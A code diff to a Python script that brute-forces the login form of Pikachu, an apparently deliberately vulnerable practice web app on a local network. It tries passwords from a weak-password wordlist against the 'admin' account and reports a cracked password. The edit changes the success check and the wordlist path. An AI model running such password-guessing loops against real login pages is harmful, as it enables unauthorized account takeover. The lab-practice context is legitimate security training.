@@ -7,8 +7,8 @@ url = 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_form.php'
 # username = input("账号名")
 def burteforce_form(url):
     username = 'admin'
-    error_message = 'username or password is not exists～'
-    password_file = '弱口令1000'
+    error_message = 'login success'
+    password_file = 'C:/Users/MZS/PycharmProjects/Web_Vulnerablility/burteforce/口令'
 
     with open(password_file, 'r') as f:
         for password in f:
@@ -22,7 +22,7 @@ def burteforce_form(url):
 
             response = requests.post(url, data=data)
 
-            if error_message not in response.text:
+            if error_message in response.text:
                 print('密码破解成功：', password)
                 return True
             else:
